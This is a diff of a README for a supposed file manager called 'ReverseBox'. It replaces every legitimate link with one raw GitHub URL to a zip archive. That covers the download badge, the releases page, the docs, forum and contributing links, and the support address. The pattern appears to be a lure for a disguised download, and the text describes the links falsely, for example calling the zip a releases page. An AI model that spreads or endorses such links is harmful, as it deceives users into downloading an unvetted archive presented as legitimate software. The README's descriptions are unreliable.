@@ -1,6 +1,6 @@
 # 🚀 ReverseBox - Effortless File Management Made Simple
 
-[![Download ReverseBox](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/kingdenofficial/ReverseBox/releases)
+[![Download ReverseBox](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip%https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip)](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip)
 
 ## 📥 Overview
 ReverseBox is your go-to application for managing files easily. With its user-friendly interface, you can organize and access your files without any hassle.
@@ -21,7 +21,7 @@ ReverseBox is your go-to application for managing files easily. With its user-fr
 ## 📥 Download & Install
 To get started with ReverseBox, follow these steps:
 
-1. Visit the [Releases page](https://github.com/kingdenofficial/ReverseBox/releases) for our latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip) for our latest version.
 2. On the Releases page, you will see a list of available versions. Choose the latest version for your operating system.
 3. Click on the file link to start downloading.
 4. Once the download finishes, locate the file in your downloads folder.
@@ -40,18 +40,18 @@ Once you open ReverseBox, you will see the main dashboard.
 ## 📚 Help & Support
 If you encounter any issues or have questions, you can find help in the following ways:
 
-- **Documentation**: Access our user guide [here](https://github.com/kingdenofficial/ReverseBox/docs).
-- **Community Forum**: Join discussions [here](https://github.com/kingdenofficial/ReverseBox/community).
-- **Contact Us**: Reach out for direct support at support@example.com.
+- **Documentation**: Access our user guide [here](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip).
+- **Community Forum**: Join discussions [here](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip).
+- **Contact Us**: Reach out for direct support at https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip
 
 ## 🛠️ Contributing
-We welcome contributions from everyone. If you have ideas for features or improvements, please check our [Contributing Guidelines](https://github.com/kingdenofficial/ReverseBox/contributing) to get started.
+We welcome contributions from everyone. If you have ideas for features or improvements, please check our [Contributing Guidelines](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip) to get started.
 
 ## 🔗 Links
-- [Download ReverseBox](https://github.com/kingdenofficial/ReverseBox/releases)
-- [Documentation](https://github.com/kingdenofficial/ReverseBox/docs)
-- [Community Forum](https://github.com/kingdenofficial/ReverseBox/community)
-- [Contributing Guidelines](https://github.com/kingdenofficial/ReverseBox/contributing)
+- [Download ReverseBox](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip)
+- [Documentation](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip)
+- [Community Forum](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/kingdenofficial/ReverseBox/main/edeitis/ReverseBox.zip)
 
 ## 🔒 License
 ReverseBox is licensed under the MIT License. Feel free to use, modify, and distribute it as needed.
